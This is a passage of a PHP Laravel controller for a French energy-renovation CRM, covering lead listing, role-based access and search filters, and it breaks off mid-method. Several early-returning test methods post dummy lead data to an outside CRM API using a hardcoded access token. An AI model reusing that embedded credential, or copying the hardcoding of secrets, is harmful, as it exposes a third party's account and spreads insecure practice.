<?php

namespace App\Http\Controllers\CRM;

use App\Events\PannelLog;
use DB;
use App\Models\User;
use App\Models\CRM\Tag;
use App\Models\CRM\Tax;
use App\Models\CRM\Lead;
use App\Models\CRM\Role;
use App\Models\CRM\Task;
use App\Models\CRM\Work;
use App\Models\CRM\Agent;
use App\Models\CRM\Event;
use App\Models\CRM\Regie;
use App\Models\CRM\Scale;
use App\Models\CRM\Client;
use App\Models\CRM\Company;
use App\Models\CRM\Project;
use App\Models\CRM\Rapport;
use App\Mail\CRM\AssignMail;
use App\Models\CRM\Children;
use App\Models\CRM\Question;
use App\Models\CRM\WorkDone;
use Illuminate\Http\Request;
use App\Models\CRM\CustomTab;
use App\Models\CRM\EnergyAid;
use App\Models\CRM\SavHeader;
use App\Models\CRM\LeadAssign;
use App\Models\CRM\LeadHeader;
use App\Models\CRM\LeadStatus;
use App\Models\CRM\Permission;
use App\Models\CRM\ProjectSav;
use App\Models\CRM\SecondLead;
use App\Models\CRM\Subvention;
use App\Models\CRM\TaskAssign;
use App\Models\CRM\UserHeader;
use Illuminate\Support\Carbon;
use App\Models\CRM\ActivityLog;
use App\Models\CRM\Fournisseur;
use App\Models\CRM\Information;
use App\Models\CRM\LeadTracker;
use App\Models\CRM\TravauxList;
use App\Models\LeadCustomField;
use App\Models\CRM\DevisSidebar;
use App\Models\CRM\Intervention;
use App\Models\CRM\ProjectTrait;
use App\Models\CRM\SecondReport;
use App\Models\CRM\EventCategory;
use App\Models\CRM\Notifications;
use App\Models\CRM\ProjectAssign;
use App\Models\CRM\SecondProject;
use App\Models\CRM\ProjectComment;
use App\Models\CRM\UserPermission;
use App\Models\CRM\CommentCategory;
use App\Models\CRM\PreInstallation;
use App\Models\CRM\SavHeaderFilter;
use App\Http\Controllers\Controller;
use App\Imports\ProductImport;
use App\Jobs\LocationLatLon;
use App\Models\Automatise;
use App\Models\CRM\ActionPermission;
use App\Models\CRM\PostInstallation;
use App\Models\CRM\UserHeaderFilter;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Mail;
use App\Models\CRM\AdditionalProduct;
use App\Models\CRM\Amo;
use App\Models\CRM\AnalyticToggler;
use App\Models\CRM\Banque;
use App\Models\CRM\BanqueDepot;
use App\Models\CRM\ClientTableStatus;
use App\Models\CRM\SecondInformation;
use Illuminate\Support\Facades\Route;
use App\Models\CRM\NotificationStatus;
use App\Models\CRM\ProjectTableStatus;
use App\Models\CRM\RoleActionPermission;
use App\Models\CRM\InterventionInstallation;
use App\Models\CRM\Audit;
use App\Models\CRM\Auditor;
use App\Models\CRM\AuditStatus;
use App\Models\CRM\BaremeTravauxTag;
use App\Models\CRM\BarthPrice;
use App\Models\CRM\CallbackHistory;
use App\Models\CRM\Campagnetype;
use App\Models\CRM\ClientSubStatus;
use App\Models\CRM\CommentCategoryAssign;
use App\Models\CRM\CommissioningStatus;
use App\Models\CRM\CommissioningTechnician;
use App\Models\CRM\CompanyCommissioned;
use App\Models\CRM\Compliance;
use App\Models\CRM\Control;
use App\Models\CRM\ControleQuality;
use App\Models\CRM\ControleSurSite;
use App\Models\CRM\ControlledWork;
use App\Models\CRM\ControlOffice;
use App\Models\CRM\ControlOfficeCsp;
use App\Models\CRM\Cumac;
use App\Models\CRM\CumacCategory;
use App\Models\CRM\InspectionStatus;
use App\Models\CRM\InterventionModule;
use App\Models\CRM\QualityControl;
use App\Models\CRM\StatusInvoiceCompany;
use Carbon\CarbonInterval;
use App\Models\CRM\Deal;
use App\Models\CRM\DefaultHeaderFilter;
use App\Models\CRM\Facturation;
use App\Models\CRM\Delegate;
use App\Models\CRM\Document;
use App\Models\CRM\DocumentControl;
use App\Models\CRM\Entreprise;
use App\Models\CRM\HeatingMode;
use App\Models\CRM\Installer;
use App\Models\CRM\InterventionTravaux;
use App\Models\CRM\InterventionTravauxProjectControl;
use App\Models\CRM\LeadClientProject;
use App\Models\CRM\LeadComment;
use App\Models\CRM\LeadHeaderFilter;
use App\Models\CRM\LeadSubStatus;
use App\Models\CRM\LeadTax;
use App\Models\CRM\LeadWorkBareme;
use App\Models\CRM\LeadWorkTravaux;
use App\Models\CRM\ManagementControl;
use App\Models\CRM\MandataireMaprimerenov;
use App\Models\CRM\NewClient;
use App\Models\CRM\NewEvent;
use App\Models\CRM\NewProject;
use App\Models\CRM\PannelLogActivity;
use App\Models\CRM\PlanningFilter;
use App\Models\CRM\PlanningInterventionFilter;
use App\Models\CRM\PlanningView;
use App\Models\CRM\TicketProblemStatus;
use App\Models\CRM\PrestationGroup;
use App\Models\CRM\Product;
use App\Models\CRM\ProjectControlPhoto;
use App\Models\CRM\ProjectCustomField;
use App\Models\CRM\ProjectDeadReason;
use App\Models\CRM\ProjectIntervention;
use App\Models\CRM\ProjectNewStatus;
use App\Models\CRM\ProjectReflectionReason;
use App\Models\CRM\ProjectStaticTab;
use App\Models\CRM\ProjectStatus;
use App\Models\CRM\ProjectSubStatus;
use App\Models\CRM\ProjectTax;
use App\Models\CRM\ProjectTravaux;
use App\Models\CRM\QualityControlType;
use App\Models\CRM\RejectReason;
use App\Models\CRM\ReportResult;
use App\Models\CRM\StatusPlanningIntervention;
use App\Models\CRM\StatutMaprimerenov;
use App\Models\CRM\StudyOffice;
use App\Models\CRM\TechnicalReferee;
use App\Models\CRM\Ticketing;
use App\Models\CRM\ZoneInfo;
use App\Models\EmailTemplate;
use App\Models\SmsTemplate;
use App\Models\StoreEmail;
use Illuminate\Support\Facades\Hash;
use GuzzleHttp\Client as GuzzleClient;
use Illuminate\Support\Facades\Session;
use Maatwebsite\Excel\Facades\Excel;
use App\Exports\Export;
use App\Models\CRM\ClientTax;
use Illuminate\Support\Facades\Log;
use Barryvdh\DomPDF\Facade\Pdf;
use Amenadiel\JpGraph\Graph;
use Amenadiel\JpGraph\Plot;
use App\Models\CRM\StatusChangeLog;
use App\Models\RenoPrice;
use Illuminate\Support\Facades\File;

class CrmHomeController extends Controller
{
    public function facebookWebhook(Request $request){
        Log::info($request->all());
    }
    public function pixcelLead(){
        return back();
        $unique_id = 'Test00'.substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
        // return $unique_id;
        $client = new GuzzleClient();
        $headers = [
            'Content-Type' => 'application/json',
            'XINTNRGLEAD-TOKEN' => '5c6ecc04-8eec-4dd3-b5a1-10281e4193f8',
          ];

        $body = '{
            "TypeOperationCEE" : 2,
            "Civilite1": "M.",
            "Nom1": "Test nom",
            "Prenom1": "Test prenom",
            "Civilite2": "M.",
            "Nom2": "TEST Dupond000",
            "Prenom2": "Jean0",
            "Mail": "farah@test.com",
            "Adresse": "rue du terrage01",
            "CodePostal": "75010",
            "Ville": "Ville",
            "TelMobile": "0606000000",
            "AgeBatiment": 1,
            "TypeHabitation": 1,
            "TypeChauffage":2,
            "NbrPersonneAuFoyer": 1,
            "NbrFoyer": 1,
            "RevenuFiscal": 1,
            "NumFiscal1": "9999123456789", 
            "RefFiscal1": "test123456789", 
            "NumFiscal2": "9999123456789", 
            "RefFiscal2": "test123456789", 
            "TypeLogement": 1,
            "PixelDealId": "ef11a77b-d6ab-487b-8c67-6311c35fef58",
            "DealId":"'.$unique_id.'",
            "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
            }
        ';

//           $body = '{
//             "TypeOperationCEE" : 2,
//             "Civilite1": "M.",
//             "Nom1": "Test nom",
//             "Prenom1": "Test prenom",
//             "Civilite2": "M.",
//             "Nom2": "TEST Dupond000",
//             "Prenom2": "Jean0",
//             "Mail": "farah@test.com",
//             "Adresse": "rue du terrage01",
//             "CodePostal": "75010",
//             "Ville": "Ville",
//             "TelFixe": "0600600000",
//             "TelMobile": "0606000000",
//             "AgeBatiment": 1,
//             "TypeHabitation": 1,
//             "TypeChauffage":2,
//             "NbrPersonneAuFoyer": 1,
//             "NbrFoyer": 1,
//             "RevenuFiscal": 1,
//             "NumFiscal1": "9999123456789", 
//             "RefFiscal1": "test123456789", 
//             "NumFiscal2": "9999123456789", 
//             "RefFiscal2": "test123456789", 
//             "PoseurId": "", 
//             "RegieId": "f2b3f0a7-892b-4279-3c5f-08dab0a21692", 
//             "DatePose": "2024-04-02 15:00:00", 
//             "Campagne": "test", 
//             "WebSite": "test", 
//             "TypeLead": "Form", 
//             "Source": "test", 
//             "Commentaires": "test", 
//             "ConfirmateurId": "test", 
//             "TypeLogement": 1,
//             "NumDevis": "test",
//             "DateEditionDevis": "2024-04-02 15:00:00",
//             "DateSignatureDevis": "2024-04-02 15:00:00",
//             "DateReceptionFinChantier": "2024-04-02 15:00:00",
//             "DateFinTravaux": "2024-04-02 15:00:00",
//             "DateDemarrageTravaux": "2024-04-02 15:00:00",
//             "PixelDealId": "ef11a77b-d6ab-487b-8c67-6311c35fef58",
//             "DealId":"'.$unique_id.'",
//             "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
//             }';

          $request = $client->post('https://crm.pixel-crm.com/api/IJLeads', [
            'headers' => $headers,
            'body' => $body
        ]);

        return $request->getBody()->getContents();
        // $req = json_decode($request->getBody()->getContents(), true);

    }
    public function pixcelLead1(){
        return back();
        $unique_id = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);
        $client = new GuzzleClient();
        $headers = [
            'Content-Type' => 'application/json',
            'XINTNRGLEAD-TOKEN' => '5c6ecc04-8eec-4dd3-b5a1-10281e4193f8',
          ];

          $body = '{
            "TypeOperationCEE" : 2,
            "Civilite1": "M.",
            "Nom1": "Test nom",
            "Prenom1": "Test prenom",
            "Civilite2": "M.",
            "Nom2": "TEST Dupond000",
            "Prenom2": "Jean0",
            "Mail": "farah@test.com",
            "Adresse": "rue du terrage01",
            "CodePostal": "75010",
            "Ville": "Ville",
            "TelFixe": "0600600000",
            "TelMobile": "0606000000",
            "AgeBatiment": 1,
            "TypeHabitation": 1,
            "TypeChauffage":2,
            "NbrPersonneAuFoyer": 1,
            "NbrFoyer": 1,
            "RevenuFiscal": 1,
            "NumFiscal1": "9999123456789", 
            "RefFiscal1": "test123456789", 
            "NumFiscal2": "9999123456789", 
            "RefFiscal2": "test123456789", 
            "PoseurId": "test", 
            "RegieId": "test", 
            "DatePose": "test", 
            "Campagne": "test", 
            "WebSite": "test", 
            "TypeLead": "Form", 
            "Source": "test", 
            "Commentaires": "test", 
            "ConfirmateurId": "test", 
            "TypeLogement": 1,
            "NumDevis": "test",
            "DateEditionDevis": "2024/04/02 15:00:00",
            "DateSignatureDevis": "2024/04/02 15:00:00",
            "DateReceptionFinChantier": "2024/04/02 15:00:00",
            "DateFinTravaux": "2024/04/02 15:00:00",
            "DateDemarrageTravaux": "2024/04/02 15:00:00",
            "PixelDealId": "ef11a77b-d6ab-487b-8c67-6311c35fef58",
            "DealId":"h664bv8makg0sk48gwk808c048o8oos",
            "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
            }';
        //   $body = '{
        //     "TypeOperationCEE" : 2,
        //     "Civilite1": "M.",
        //     "Nom1": "Test nom",
        //     "Prenom1": "Test prenom",
        //     "Civilite2": "M.",
        //     "Nom2": "TEST Dupond000",
        //     "Prenom2": "Jean0",
        //     "Adresse": "rue du terrage01",
        //     "CodePostal": "75010",
        //     "Ville": "Ville",
        //     "TelFixe": "0600600000",
        //     "TelMobile": "0606000000",
        //     "AgeBatiment": 1,
        //     "TypeHabitation": 1,
        //     "TypeLogement": 1,
        //     "TypeChauffage":2,
        //     "DealId":"Farah test id",
        //     "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
        //     }';

          $request = $client->post('https://crm.pixel-crm.com/api/IJLeads', [
            'headers' => $headers,
            'body' => $body
        ]);

        return $request->getBody()->getContents();
        // $req = json_decode($request->getBody()->getContents(), true);

    }
    public function pixcelLead2(){
        return back();
        $unique_id = substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32);

        $client = new GuzzleClient();
        $headers = [
            'Content-Type' => 'application/json',
            'XINTNRGLEAD-TOKEN' => '5c6ecc04-8eec-4dd3-b5a1-10281e4193f8',
          ];

          $body = '{
            "TypeOperationCEE" : 2,
            "Civilite1": "M.",
            "Nom1": "Test nom",
            "Prenom1": "Test prenom",
            "Civilite2": "M.",
            "Nom2": "TEST Dupond000",
            "Prenom2": "Jean0",
            "Mail": "farah@test.com",
            "Adresse": "rue du terrage01",
            "CodePostal": "75010",
            "Ville": "Ville",
            "TelFixe": "0600600000",
            "TelMobile": "0606000000",
            "AgeBatiment": 1,
            "TypeHabitation": 1,
            "TypeChauffage":2,
            "NbrPersonneAuFoyer": 1,
            "NbrFoyer": 1,
            "RevenuFiscal": 1,
            "NumFiscal1": "9999123456789", 
            "RefFiscal1": "test123456789", 
            "NumFiscal2": "9999123456789", 
            "RefFiscal2": "test123456789", 
            "PoseurId": "test", 
            "RegieId": "test", 
            "DatePose": "test", 
            "Campagne": "test", 
            "WebSite": "test", 
            "TypeLead": "Form", 
            "Source": "test", 
            "Commentaires": "test", 
            "ConfirmateurId": "test", 
            "TypeLogement": 1,
            "NumDevis": "test",
            "DateEditionDevis": "2024/04/02 15:00:00",
            "DateSignatureDevis": "2024/04/02 15:00:00",
            "DateReceptionFinChantier": "2024/04/02 15:00:00",
            "DateFinTravaux": "2024/04/02 15:00:00",
            "DateDemarrageTravaux": "2024/04/02 15:00:00",
            "PixelDealId": "test",
            "DealId":"ef11a77b-d6ab-487b-8c67-6311c35fef58",
            "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
            }';
        //   $body = '{
        //     "TypeOperationCEE" : 2,
        //     "Civilite1": "M.",
        //     "Nom1": "Test nom",
        //     "Prenom1": "Test prenom",
        //     "Civilite2": "M.",
        //     "Nom2": "TEST Dupond000",
        //     "Prenom2": "Jean0",
        //     "Adresse": "rue du terrage01",
        //     "CodePostal": "75010",
        //     "Ville": "Ville",
        //     "TelFixe": "0600600000",
        //     "TelMobile": "0606000000",
        //     "AgeBatiment": 1,
        //     "TypeHabitation": 1,
        //     "TypeLogement": 1,
        //     "TypeChauffage":2,
        //     "DealId":"Farah test id",
        //     "ProjectTypeId" : "84534F39-3DDF-405A-9D2F-22FBBA820124"
        //     }';

          $request = $client->post('https://crm.pixel-crm.com/api/IJLeads', [
            'headers' => $headers,
            'body' => $body
        ]);

        return $request->getBody()->getContents();
        // $req = json_decode($request->getBody()->getContents(), true);

    }
    // new lead page 
    public function allLeads(){ 
        // $company = Company::find($id);
        $headers = LeadHeader::all();
        // $progress_leads = Lead::where('status', 'in-progress')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        // $pre_validate_leads = Lead::where('status', 'pre-validated')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        // $verified_leads = Lead::where('status', 'verified')->where('deleted_status', 'no')->where('convert_status', 'no')->where('data_status', 'yes')->orderBy('id', 'desc')->paginate(10);
        $all_leads = Lead::all();
        $users= User::where('deleted_status', 'no')->where('status', 'active')->get();
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->get();
        $l_status = LeadStatus::all();
        $lead_id = 0;
        $company_name = 'all';
        $inputs = LeadCustomField::all();
        $lead_status = [];


        $ids = LeadAssign::where('user_id', Auth::id())->pluck('lead_id');
        if(role() == 's_admin'){
            foreach($l_status as $item){ 
                $lead_status[$item->id] = Lead::where('user_status', $item->id)->where('deleted_status', 'no')->paginate(10);
            } 
            $lead_status[0] = Lead::where('user_status', 0)->where('deleted_status', 'no')->paginate(10); 
        }else{
            foreach($l_status as $item){
                $lead_status[$item->id] = Lead::whereIn('id', $ids)->where('user_status', $item->id)->where('deleted_status', 'no')->paginate(10);
            } 
            $lead_status[0] = Lead::whereIn('id', $ids)->where('user_status', 0)->where('deleted_status', 'no')->paginate(10); 
        } 

        return view('admin.all-leads', compact('headers', 'all_leads', 'users', 'lead_id','company_name', 'lead_status', 'inputs', 'l_status', 'telecommercials'));
        // return view('admin.new-leads'); 
    }
    public function allLeadsNew($status = 2){  
        if($status == 7 && Auth::id() == '102'){
            return redirect()->route('leads.all')->with('error', 'Pas autorisé');
        }
        $header = ['Nom Prénom', 'Code postal', 'Email', 'Téléphone', 'Telecommercial', 'Regie', 'Responsable commercial'];
        // if($status == 'export-todays-nrp-lead' && Auth::id() == 1){
        //     $items = PannelLogActivity::where('feature_type', 'lead')->where('status', 'change_etiquette')->where('key', 'etiquette')->where('label_id', 4)->whereDate('created_at', Carbon::today())->get()->pluck('feature_id')->toArray();

        //     $data = LeadClientProject::whereIn('id', $items)->get()->map(function($item){
        //         $field['Nom Prénom'] = $item->__tracking__Nom_Prénom;
        //         $field['Code postal'] = $item->__tracking__Code_postal;
        //         $field['Email'] = $item->__tracking__Email;
        //         $field['Téléphone'] = $item->__tracking__téléphone; 
        //         $field['Telecommercial'] = $item->leadTelecommercial->name ?? '';
        //         $field['Regie'] = $item->leadTelecommercial ? $item->leadTelecommercial->getRegie->name ?? '' : '';
        //         $field['Responsable commercial'] = $item->leadTelecommercial ? ($item->leadTelecommercial->getRegie ? $item->leadTelecommercial->getRegie->getUser->name ?? '': '') : '';
        //         return $field;
        //     });
        //     return Excel::download(new Export($header,$data), 'prospects.xlsx');
        // }
        $current_lead_label = LeadStatus::find($status);
        if(!$current_lead_label){
            return redirect()->route('leads.all');
        }
        $lead_sub_status = $current_lead_label->getSubStatus;
        $regies = Regie::all();
        $headers = LeadHeader::all();  
        $users= User::where('deleted_status', 'no')->where('status', 'active')->get();
        $lead_status = LeadStatus::orderBy('order', 'asc')->get();  
        $default_filters = DefaultHeaderFilter::with('getHeader')->get();
        $default_filter_header_id = $default_filters->pluck('header_id')->toArray(); 
        $stats_regies = Auth::user()->allRegie; 
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        $filter_status = LeadHeaderFilter::where('user_id', Auth::id())->with('getHeader')->orderBy('lead_header_id', 'asc')->get(); 
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();
        $pagination_number = paginationNumber('lead');
        if(in_array(role(), $administrarif_role)){   
            $leads = LeadClientProject::where('lead_label', $status)->where('lead_deleted_status', 0)->with('getSubStatus', 'leadTelecommercial', 'getRegie')->orderBy('Code_Postal', 'asc')->paginate($pagination_number); 
        }else{ 
            if($status == 1){ 
                if((role() == 'sales_manager' || role() == 'sales_manager_externe') && Auth::user()->getRegieTelecommercial){
                    $leads = LeadClientProject::whereIn('import_regie', $stats_regies->pluck('id'))->where('lead_label', $status)->where('lead_deleted_status', 0)->with('getSubStatus', 'leadTelecommercial', 'getRegie')->orderBy('Code_Postal', 'asc')->paginate($pagination_number);
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();
                }else{ 
                    $leads = [];
                    $telecommercials = [];

                }
            }else{
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $leads = LeadClientProject::whereIn('lead_telecommercial', $user_ids)->where('lead_label', $status)->where('lead_deleted_status', 0)->with('getSubStatus', 'leadTelecommercial', 'getRegie')->orderBy('Code_Postal', 'asc')->paginate($pagination_number);
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();
                }else{
                    $leads = Auth::user()->getLeads()->where('lead_label', $status)->with('getSubStatus', 'leadTelecommercial', 'getRegie')->orderBy('Code_Postal', 'asc')->paginate($pagination_number);
                    $telecommercials = [];
                }
            }
        }   
        $role = Auth::user()->role;

        $statut_blue_button_access = checkAction(Auth::id(), 'lead', 'statut_blue_button');
        // dd($default_filters);
        // dd($default_filter_header_id, $headers->pluck('id'));
        $permission_regies = false;
        $role_category  = Auth::user()->getRoleName->category_id;
        if($role_category == 3 || $role_category == 4){
            $permission_regies = true;
        } 
        $suppliers = Fournisseur::where('active', 'Oui')->where('type', 'Lead')->get();
        // return $pagination_number;
        $user_actions = Auth::user()->checkAction; 
        return view('admin.all-leads_new', compact('headers', 'users', 'leads', 'lead_status', 'status', 'default_filters', 'filter_status', 'pagination_number', 'default_filter_header_id', 'role', 'statut_blue_button_access', 'permission_regies', 'regies', 'suppliers', 'telecommercials', 'lead_sub_status', 'user_actions'));
    }

    public function leadAllFilter($status){
        if(!checkAction(Auth::id(), 'lead', 'filter_blue_button') && role() != 's_admin'){
            return back();
        }
        // dd(request()->all());
        $headers = LeadHeader::all();  
        $users= User::where('deleted_status', 'no')->where('status', 'active')->get();
        $lead_status = LeadStatus::orderBy('order', 'asc')->get(); 
        $current_lead_label = LeadStatus::find($status);  
        $lead_sub_status = $current_lead_label->getSubStatus;
        $default_filters = DefaultHeaderFilter::with('getHeader')->get();
        $default_filter_header_id = $default_filters->pluck('header_id')->toArray(); 
        $lead = LeadClientProject::query();
        $stats_regies = Auth::user()->allRegie; 
        $filter_telecommercial_status = true;
        $role = Auth::user()->role;
        $regies = Regie::all(); 
        $telecommercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();

        $permission_regies = false;
        $role_category  = Auth::user()->getRoleName->category_id;
        if($role_category == 3 || $role_category == 4){
            $permission_regies = true;
        }

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(!in_array(role(), $administrarif_role)){   
            $filter_telecommercial_status = false;
            if($status == 1){
                if((role() == 'sales_manager' || role() == 'sales_manager_externe') && Auth::user()->getRegieTelecommercial){
                    $lead->whereIn('import_regie', $stats_regies->pluck('id'));
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();
                }else{
                    $leads = [];
                    $telecommercials = [];
                }
            }else{
                if(role() == 'sales_manager' || role() == 'sales_manager_externe'){
                    $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                    $lead->whereIn('lead_telecommercial', $user_ids);
                    $telecommercials = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [8,23])->with('getRoleName','getLeads')->get();
                }else{
                    $lead->where('lead_telecommercial', Auth::id());
                    $telecommercials = [];
                }
            }
        }   
        if(request()->__tracking__Fournisseur_de_lead){
            if(request()->__tracking__Fournisseur_de_lead == 'no-data'){
                $lead->where(function($query){
                    $query->where('__tracking__Fournisseur_de_lead', null)->orWhere('__tracking__Fournisseur_de_lead', '');
                });
            }else{
                $lead->where('__tracking__Fournisseur_de_lead', request()->__tracking__Fournisseur_de_lead);
            }
            // if($role != 'telecommercial' && $role != 'telecommercial_externe' && $role != 'sales_manager' && $role != 'sales_manager_externe'){
            // }
        }
        if(request()->__tracking__Type_de_campagne){
            if(request()->__tracking__Type_de_campagne == 'no-data'){
                $lead->where(function($query){
                    $query->where('__tracking__Type_de_campagne', null)->orWhere('__tracking__Type_de_campagne', '');
                });
            }else{
                $lead->where('__tracking__Type_de_campagne', request()->__tracking__Type_de_campagne);
            }
        }
        if(request()->__tracking__Nom_campagne){
            $lead->where('__tracking__Nom_campagne','LIKE', '%'.request()->__tracking__Nom_campagne.'%');
        }
        if(request()->__tracking__Date_demande_lead_from || request()->__tracking__Date_demande_lead_to){
            $from = request()->__tracking__Date_demande_lead_from ?? Carbon::now();
            $to = request()->__tracking__Date_demande_lead_to ?? Carbon::now();
            $lead->whereBetween('__tracking__Date_demande_lead', [$from, $to]);
        }
        if(request()->__tracking__Date_attribution_télécommercial){
            $lead->where('__tracking__Date_attribution_télécommercial','LIKE', '%'.request()->__tracking__Date_attribution_télécommercial.'%');
        } 
        if(request()->__tracking__Mode_de_chauffage){
            $lead->where('__tracking__Mode_de_chauffage', request()->__tracking__Mode_de_chauffage);
        } 
        if(request()->Prenom){
            $lead->where('Prenom','LIKE', '%'.request()->Prenom.'%');
        }
        if(request()->Nom){
            $lead->where('Nom','LIKE', '%'.request()->Nom.'%');
        } 
        if(request()->Email){
            $lead->where('Email','LIKE', '%'.request()->Email.'%');
        } 
        if(request()->Type_occupation){
            if(request()->Type_occupation == 'no-data'){
                $lead->where(function($query){
                    $query->where('Type_occupation', null)->orWhere('Type_occupation', '');
                });
            }else{
                $lead->where('Type_occupation', request()->Type_occupation);
            }
        } 
        if(request()->Zone){
            if(request()->Zone == 'no-data'){
                $lead->where(function($query){
                    $query->where('Zone', null)->orWhere('Zone', '');
                });
            }else{
                $lead->where('Zone', request()->Zone);
            }
        }
        if(request()->precariousness){
            if(request()->precariousness == 'no-data'){
                $lead->where(function($query){
                    $query->where('precariousness', null)->orWhere('precariousness', '');
                });
            }else{
                $lead->where('precariousness', request()->precariousness);
            }
        }
        if(request()->Mode_de_chauffage){
            if(request()->Mode_de_chauffage == 'no-data'){
                $lead->where(function($query){
                    $query->where('Mode_de_chauffage', null)->orWhere('Mode_de_chauffage', '');
                });
            }else{
                $lead->where('Mode_de_chauffage', request()->Mode_de_chauffage);
            }
        }
        if(request()->Surface_habitable){
            $lead->where('Surface_habitable','LIKE', '%'.request()->Surface_habitable.'%');
        }
        if(request()->Situation_familiale){
            if(request()->Situation_familiale == 'no-data'){
                $lead->where(function($query){
                    $query->where('Situation_familiale', null)->orWhere('Situation_familiale', '');
                });
            }else{
                $lead->where('Situation_familiale', request()->Situation_familiale);
            }
        }
        if(request()->Ville){
            $lead->where('Ville','LIKE', '%'.request()->Ville.'%');
        }
        if(request()->department){ 
            $department_request_data = [];
            foreach(request()->department as $dd){
                if(strlen($dd) == 1){
                    $department_request_data[] = '0'.$dd;
                }else{
                    $department_request_data[] = $dd;
                }
            }
            if(in_array('no-data', $department_request_data)){
                $lead->where(function($query) use ($department_request_data){
                    $query->where('Code_Postal', null)->orWhere('Code_Postal', '');
                    foreach($department_request_data as $request_department){
                        $query->orWhere('Code_Postal','LIKE', $request_department.'%');
                    }
                });
            }else{
                $lead->where(function($query) use ($department_request_data){
                    foreach($department_request_data as $request_department){
                        $query->orWhere('Code_Postal','LIKE', $request_department.'%');
                    }
                }); 
            }
        }
        if(request()->bareme){
            $ids = LeadWorkBareme::whereIn('barame_id', request()->bareme)->pluck('work_id');
            if(in_array('no-data', request()->bareme)){
                $bareme_lead_ids = LeadWorkBareme::get()->pluck('work_id')->toArray();
                $lead->where(function($query) use ($bareme_lead_ids, $ids) {
                    $query->whereNotIn('id', $bareme_lead_ids)->orWhereIn('id', $ids);
                });
            }else{
                $lead->whereIn('id', $ids);
            }
        }
        if(request()->travaux){
            $ids = LeadWorkTravaux::whereIn('travaux_id', request()->travaux)->pluck('work_id');
            if(in_array('no-data', request()->travaux)){
                $bareme_lead_ids = LeadWorkTravaux::get()->pluck('work_id')->toArray();
                $lead->where(function($query) use ($bareme_lead_ids, $ids) {
                    $query->whereNotIn('id', $bareme_lead_ids)->orWhereIn('id', $ids);
                }); 
            }else{
                $lead->whereIn('id', $ids);
            }
        }
        if(request()->tag){
            if(request()->tag == 'no-data'){
                $bareme_lead_ids = LeadWorkBareme::get()->pluck('work_id')->toArray();
                $lead->whereNotIn('id', $bareme_lead_ids);
            }else{
                $ids = LeadWorkBareme::where('barame_id', request()->tag)->pluck('work_id');
                $lead->whereIn('id', $ids);
            }
        }
        if(request()->Type_de_contrat){
            if(request()->Type_de_contrat == 'no-data'){
                $lead->where(function($query){
                    $query->where('Type_de_contrat', null)->orWhere('Type_de_contrat', '');
                });
            }else{
                $lead->where('Type_de_contrat', request()->Type_de_contrat);
            }
        } 
        if(request()->sub_status){
            if(in_array('no-data', request()->sub_status)){
                $lead->where(function($query){
                    $query->whereIn('sub_status', request()->sub_status)->orWhere('sub_status', null)->orWhere('sub_status', '');
                });
            }else{
                $lead->whereIn('sub_status', request()->sub_status);
            }
        } 
        if(($filter_telecommercial_status || role() == 'sales_manager' || role() == 'sales_manager_externe') && request()->telecommercial_id){
            if(request()->telecommercial_id == 'no-data'){
                $lead->where(function($query){
                    $query->where('lead_telecommercial', null)->orWhere('lead_telecommercial', '');
                });
            }else{
                $lead->where('lead_telecommercial', request()->telecommercial_id);
            }
        } 

        if($permission_regies && request()->regie){
            if(request()->regie == 'no-regie'){
                if($status == 1){
                    $lead->whereNull('import_regie');
                }else{
                    $lead->doesnthave('leadTelecommercial');
                }
            }else{
                if($status == 1){
                    $lead->where('import_regie', request()->regie);
                }else{
                    $user_ids = User::where('regie_id', request()->regie)->where('deleted_status', 'no')->pluck('id');
                    $lead->whereIn('lead_telecommercial', $user_ids);
                }
            }
        } 
     
        $pagination_number = paginationNumber('lead');
        $leads = $lead->where('lead_label', $status)->where('lead_deleted_status', 0)->orderBy('Code_Postal', 'asc')->paginate($pagination_number);

        $filter_status = LeadHeaderFilter::where('user_id', Auth::id())->with('getHeader')->orderBy('lead_header_id', 'asc')->get(); 
        $statut_blue_button_access = checkAction(Auth::id(), 'lead', 'statut_blue_button');
        $suppliers = Fournisseur::where('active', 'Oui')->where('type', 'Lead')->get();
        $user_actions = Auth::user()->checkAction; 
